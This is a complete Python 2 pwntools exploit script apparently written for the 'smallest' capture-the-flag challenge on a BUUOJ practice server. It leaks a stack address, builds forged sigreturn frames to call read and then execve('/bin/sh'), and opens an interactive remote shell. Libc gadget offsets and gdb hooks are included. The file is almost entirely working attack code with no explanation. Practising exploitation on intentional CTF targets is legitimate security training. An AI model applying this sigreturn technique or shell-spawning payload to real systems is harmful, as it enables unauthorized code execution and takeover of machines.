#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/28 17:28:09
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 1
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    sh = process('smallest')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
else:
    IP = 'node4.buuoj.cn'
    port = 26713
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
    one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
elf = ELF('smallest')

def debug():
    gdb.attach(sh,"b *0x4000c0")
    pause()

start_addr = 0x00000000004000B0
syscall_ret = 0x00000000004000BE
start_void_rax_addr = 0x00000000004000B3

payload = p64(start_addr) *3
sh.send(payload)
sleep(0.3)

sh.send('\xb3')
stack_addr = u64(sh.recv()[0x148:0x148+8]) 
print hex(stack_addr)

sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_read
sigframe.rdi = 0
sigframe.rdx = 0x400
sigframe.rsi = stack_addr
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret

payload = p64(start_addr) + 'sigretaa' + str(sigframe)
debug()
sh.send(payload)
sleep(0.3)

trigger_sigret = p64(syscall_ret) + 'a'*7
sh.send(trigger_sigret)
sleep(0.3)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rsp = stack_addr
sigframe.rsi = 0
sigframe.rdx = 0
sigframe.rdi = stack_addr + 0x150
sigframe.rip = syscall_ret
payload = (p64(start_addr) + 'sigretaa' + str(sigframe)).ljust(0x150,'a') + "/bin/sh\x00"
sh.send(payload)
sleep(0.3)
sh.send(trigger_sigret)
                                                                                   
sh.interactive()